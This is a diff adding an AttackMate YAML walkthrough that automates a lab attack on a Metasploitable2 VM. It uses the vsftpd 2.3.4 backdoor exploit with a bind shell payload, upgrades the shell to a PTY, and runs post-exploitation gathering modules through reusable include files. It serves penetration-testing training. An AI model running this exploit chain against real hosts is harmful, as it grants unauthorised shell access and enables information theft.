@@ -1,0 +1,101 @@
+#
+# Walkthrough 4: Modular Playbook with Include Files
+#
+# Description:
+#     Demonstrates how to structure a playbook modularly using include files.
+#     This is a refactored version of walkthrough 01 (vsftpd backdoor) that
+#     pulls the shell upgrade and post-exploitation gathering steps into
+#     reusable include files.
+#
+#     Attack steps:
+#     1. Exploit the vsftpd backdoor (same as walkthrough 01)
+#     2. Verify access in the raw shell
+#     3. Include upgrade_shell.yml to set up a PTY
+#     4. Run commands on the upgraded shell
+#     5. Include gather_commands.yml to run post modules
+#
+# Why modularize?
+#     The includes/ directory contains:
+#       - upgrade_shell.yml:   reusable PTY upgrade for any raw shell session
+#       - gather_commands.yml: standard post-exploitation info gathering
+#     Both can be included from any playbook that has an active session.
+#     You only maintain the logic once.
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml 04_modular_include.yml
+#
+# IMPORTANT: Replace METASPLOITABLE and ATTACKER with your actual IPs!
+#
+
+vars:
+  METASPLOITABLE: 192.168.56.101
+  ATTACKER: 192.168.56.1
+  PAYLOAD: cmd/unix/bind_ruby
+  INCLUDE_PATH: ./includes
+
+commands:
+  # ============================================
+  # STEP 1: Exploit the vsftpd backdoor
+  # (Same as walkthrough 01)
+  # ============================================
+  - type: debug
+    cmd: "Note: the vsftpd exploit can take up to 30 seconds."
+
+  - type: msf-module
+    cmd: exploit/unix/ftp/vsftpd_234_backdoor
+    payload: $PAYLOAD
+    options:
+      RHOSTS: $METASPLOITABLE
+    creates_session: shell
+
+  # ============================================
+  # STEP 2: Verify access
+  # ============================================
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  - type: debug
+    cmd: "Shell identity: $RESULT_STDOUT"
+
+  # ============================================
+  # STEP 3: Upgrade the shell to a PTY
+  #
+  # Set $UPGRADESESSION to the session name, then include upgrade_shell.yml.
+  # The include file reads $UPGRADESESSION to know which session to upgrade.
+  # This pattern is the convention for passing parameters to includes.
+  # ============================================
+  - type: setvar
+    variable: UPGRADESESSION
+    cmd: shell
+
+  - type: include
+    local_path: $INCLUDE_PATH/upgrade_shell.yml
+
+  # ============================================
+  # STEP 4: Use the upgraded shell
+  #
+  # After the include, the session has a proper PTY. Interactive programs
+  # work correctly now
+  # ============================================
+  - type: msf-session
+    session: shell
+    cmd: ps aux
+
+  # ============================================
+  # STEP 5: Run post modules via include
+  #
+  # Set $GATHER_SESSION to the numeric Metasploit session ID,
+  # then include gather_commands.yml which runs post modules against it.
+  # ============================================
+  - type: setvar
+    variable: GATHER_SESSION
+    cmd: $LAST_MSF_SESSION
+
+  - type: include
+    local_path: $INCLUDE_PATH/gather_commands.yml
+
+  - type: debug
+    cmd: "Walkthrough complete. Check output.log for results. The include files can be reused with any session."
